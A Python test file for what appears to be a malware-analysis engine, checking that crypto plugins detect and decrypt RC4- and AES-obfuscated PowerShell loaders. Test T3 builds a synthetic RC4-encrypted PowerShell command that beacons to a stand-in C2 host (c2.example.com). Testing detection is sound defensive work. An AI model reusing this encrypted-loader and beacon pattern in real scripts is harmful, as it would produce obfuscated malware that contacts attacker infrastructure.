"""UAIE Crypto Stack Capability Pack · CI Gate (Priority 5).

Proves the 5 new crypto plugins are wired into the UAIE loop and
actually contribute forensic evidence:

  · crypto.rc4                  (BaseDecoder wrap)
  · crypto.aes_cbc              (BaseDecoder wrap)
  · crypto.shape_detector       (ciphertext-shape analyzer)
  · op.rc4-inline-decrypt       (function-only transformer)
  · op.crypto-api-annotator     (annotator, evidence-only)

Run:  cd /app/backend && python -m pytest tests/test_crypto_capability_pack.py -v
"""
from __future__ import annotations

import base64
import os
import secrets
import sys

sys.path.insert(0, "/app/backend")
os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
os.environ.setdefault("DB_NAME", "test_database")

from services.uaie.orchestrator import Orchestrator
from services.uaie              import plugins as _plugins_pkg


# ─────────────────────────────────────────────────────────────────────
# Test helper — deterministic RC4 for building a realistic RC4 loader.
# ─────────────────────────────────────────────────────────────────────
def _rc4(k: bytes, d: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + k[i % len(k)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for c in d:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(c ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


# ─────────────────────────────────────────────────────────────────────
# T1 · All 5 crypto plugins are registered.
# ─────────────────────────────────────────────────────────────────────
def test_all_crypto_plugins_registered():
    plugins = {p["name"]: p for p in _plugins_pkg.all_plugins()}
    expected = {
        "crypto.rc4":                 "decoder",
        "crypto.aes_cbc":             "decoder",
        "crypto.shape_detector":      "analyzer",
        "op.rc4-inline-decrypt":      "transformer",
        "op.crypto-api-annotator":    "transformer",
    }
    for name, semantic in expected.items():
        assert name in plugins, f"crypto plugin {name!r} missing"
        assert plugins[name]["semantic"] == semantic, (
            f"{name}: expected semantic={semantic!r}, "
            f"got {plugins[name]['semantic']!r}"
        )


# ─────────────────────────────────────────────────────────────────────
# T2 · CryptoDetect flags a random ciphertext-shaped blob.
# ─────────────────────────────────────────────────────────────────────
def test_shape_detector_fires_on_high_entropy_base64():
    """96 bytes of pure random noise wrapped in FromBase64String is the
    canonical modern-loader shape.  CryptoDetectDecoder must emit
    ``tradecraft.crypto-key-required`` + MITRE T1027.013 so the analyst
    knows key material is required to complete the peel."""
    blob = secrets.token_bytes(96)
    payload = (
        b'$c = [System.Convert]::FromBase64String("'
        + base64.b64encode(blob) + b'")'
    )
    orch = Orchestrator(recognizers=_plugins_pkg.all_recognizers())
    result = orch.run(payload, root_type="powershell")

    tradecraft = [ev for ev in result.evidence
                    if ev.kind.startswith("tradecraft.")]
    key_required = [ev for ev in tradecraft
                      if "crypto-key-required" in (ev.kind + " " + str(ev.value))]
    assert key_required, (
        f"crypto.shape_detector failed to emit 'crypto-key-required' "
        f"tradecraft.  Evidence kinds: "
        f"{sorted({e.kind for e in result.evidence})}"
    )
    mitre = [ev for ev in result.evidence
              if "T1027.013" in (ev.mitre_techniques or [])]
    assert mitre, "expected MITRE T1027.013 for ciphertext without key"


# ─────────────────────────────────────────────────────────────────────
# T3 · RC4 inline-decrypt op recovers plaintext when key + cipher are inline.
# ─────────────────────────────────────────────────────────────────────
def test_rc4_inline_decrypt_op_recovers_plaintext():
    key = b"nivxray-rc4-test-key"
    plain = (b"powershell.exe -NoProfile -Command \"Invoke-WebRequest "
             b"http://c2.example.com/beacon.php\"")
    cipher = _rc4(key, plain)
    b64c = base64.b64encode(cipher).decode()

    payload = (
        f'$k = [System.Text.Encoding]::UTF8.GetBytes("{key.decode()}")\n'
        f'$c = [Convert]::FromBase64String("{b64c}")\n'
        '$S = (0..255)\n'
        'for ($i=0; $i -lt 256; $i++) { $j = ($j + $S[$i] + $k[$i % $k.Length]) % 256 }\n'
        'for ($x=0; $x -lt $c.Length; $x++) { $c[$x] -bxor $S[($S[$i] + $S[$j]) % 256] }'
    ).encode()

    orch = Orchestrator(recognizers=_plugins_pkg.all_recognizers())
    result = orch.run(payload, root_type="powershell")

    # Any artifact carrying the recovered plaintext proves the op fired.
    hits = [a for a in result.artifacts.values()
             if b"c2.example.com" in a.payload or b"beacon.php" in a.payload]
    assert hits, (
        f"op.rc4-inline-decrypt failed to recover plaintext.  "
        f"Artifacts (first 5 types): "
        f"{sorted({a.artifact_type for a in list(result.artifacts.values())[:20]})}"
    )


# ─────────────────────────────────────────────────────────────────────
# T4 · Crypto-API annotator surfaces AES usage as evidence, no child.
# ─────────────────────────────────────────────────────────────────────
def test_crypto_api_annotator_surfaces_aes_without_child():
    payload = (
        b"$aes = [System.Security.Cryptography.Aes]::Create()\n"
        b"$aes.KeySize = 256\n"
        b"$aes.Mode = 'CBC'\n"
        b"$dec = $aes.CreateDecryptor($key, $iv)"
    )
    orch = Orchestrator(recognizers=_plugins_pkg.all_recognizers())
    result = orch.run(payload, root_type="powershell")

    annotator_ev = [ev for ev in result.evidence
                      if ev.source_capability == "op.crypto-api-annotator"]
    assert annotator_ev, (
        f"op.crypto-api-annotator did not emit evidence for an "
        f"AES-Create payload.  Evidence sources: "
        f"{sorted({e.source_capability for e in result.evidence})}"
    )
    # The annotator itself must not spawn a child artifact.
    from services.uaie.artifact import make_artifact  # noqa
    kids_from_annotator = [
        e for e in result.ledger
        if e.action == "enqueue" and e.actor == "op.crypto-api-annotator"
    ]
    assert not kids_from_annotator, (
        f"annotator must not enqueue children; got: {kids_from_annotator}"
    )


# ─────────────────────────────────────────────────────────────────────
# T5 · Determinism (R28 purity) across the full crypto stack.
# ─────────────────────────────────────────────────────────────────────
def test_crypto_stack_is_deterministic():
    blob = b"\x11" * 8 + b"\xaa" * 88   # stable, high-entropy-adjacent
    payload = (
        b'$c = [System.Convert]::FromBase64String("'
        + base64.b64encode(blob) + b'"); $aes = [System.Security.Cryptography.Aes]::Create()'
    )
    r1 = Orchestrator(recognizers=_plugins_pkg.all_recognizers()).run(
        payload, root_type="powershell")
    r2 = Orchestrator(recognizers=_plugins_pkg.all_recognizers()).run(
        payload, root_type="powershell")
    def _fp(evs):
        return sorted((e.kind, str(e.value)[:200], e.source_capability,
                       tuple(e.mitre_techniques)) for e in evs)
    assert _fp(r1.evidence) == _fp(r2.evidence), (
        "crypto stack must be pure (R28) — same input, same evidence"
    )
